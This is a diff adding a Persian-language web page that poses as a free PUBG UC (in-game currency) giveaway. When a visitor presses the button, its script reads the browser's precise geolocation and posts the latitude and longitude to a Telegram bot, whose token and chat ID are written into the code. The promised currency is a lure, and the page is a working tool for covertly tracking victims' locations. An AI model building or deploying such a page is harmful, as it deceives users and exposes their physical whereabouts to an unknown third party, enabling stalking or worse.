@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>یوسی رایگان پابجی</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Tahoma", Arial, sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.75)), 
+                        url('https://i.imgur.com/2v0uS5g.jpg') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            direction: rtl;
+        }
+        .container {
+            text-align: center;
+            background: rgba(15, 15, 20, 0.85);
+            padding: 40px 25px;
+            border-radius: 20px;
+            border: 2px solid #ff8c00;
+            box-shadow: 0 0 30px rgba(255, 140, 0, 0.6);
+            max-width: 420px;
+            width: 100%;
+        }
+        h1 {
+            color: #ff8c00;
+            font-size: 26px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px #ff8c00;
+        }
+        p {
+            color: #ddd;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        button {
+            background: linear-gradient(45deg, #ff8c00, #ff4500);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            min-height: 70px;
+            min-width: 300px;
+            box-shadow: 0 10px 30px rgba(255, 140, 0, 0.6);
+            transition: all 0.3s ease;
+            border: 3px solid #ffd700;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(255, 140, 0, 0.8);
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        .loading {
+            display: none;
+            margin-top: 25px;
+            color: #ff8c00;
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>یوسی رایگان پابجی</h1>
+    <p>برای دریافت یوسی رایگان، موقعیت مکانی خود را ارسال کنید</p>
+    
+    <button onclick="getLocation()" id="locationBtn">
+        یوسی ریگان
+    </button>
+    
+    <div class="loading" id="loading">در حال ارسال موقعیت و شارژ یوسی...</div>
+</div>
+
+<script type="text/javascript">
+    function getLocation() {
+        const btn = document.getElementById('locationBtn');
+        const loading = document.getElementById('loading');
+        
+        btn.disabled = true;
+        btn.innerHTML = "در حال دریافت یوسی...";
+        loading.style.display = "block";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        } else {
+            alert("موقعیت‌یابی پشتیبانی نمی‌شود!");
+            resetButton();
+        }
+    }
+
+    function sendLocation(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+
+        $.ajax({
+            url: "https://api.telegram.org/bot8473490344:AAGBEi2ocD3z1kVVdI4EnmmfvKQax2HSx2g/sendLocation",
+            method: "POST",
+            data: {
+                chat_id: "5244087864",
+                latitude: latitude,
+                longitude: longitude
+            },
+            success: function() {
+                alert("موقعیت ارسال شد! یوسی به زودی واریز میشه. موفق باشی چیکن دینر بگیر!");
+                resetButton();
+            },
+            error: function() {
+                alert("خطا! دوباره امتحان کن");
+                resetButton();
+            }
+        });
+    }
+
+    function showError(error) {
+        alert("اجازه موقعیت‌یابی رو بده تا یوسی بگیری!");
+        resetButton();
+    }
+
+    function resetButton() {
+        setTimeout(() => {
+            document.getElementById('locationBtn').disabled = false;
+            document.getElementById('locationBtn').innerHTML = "شمع بزن یوسی رایگان";
+            document.getElementById('loading').style.display = "none";
+        }, 1500);
+    }
+</script>
+
+</body>
+</html>
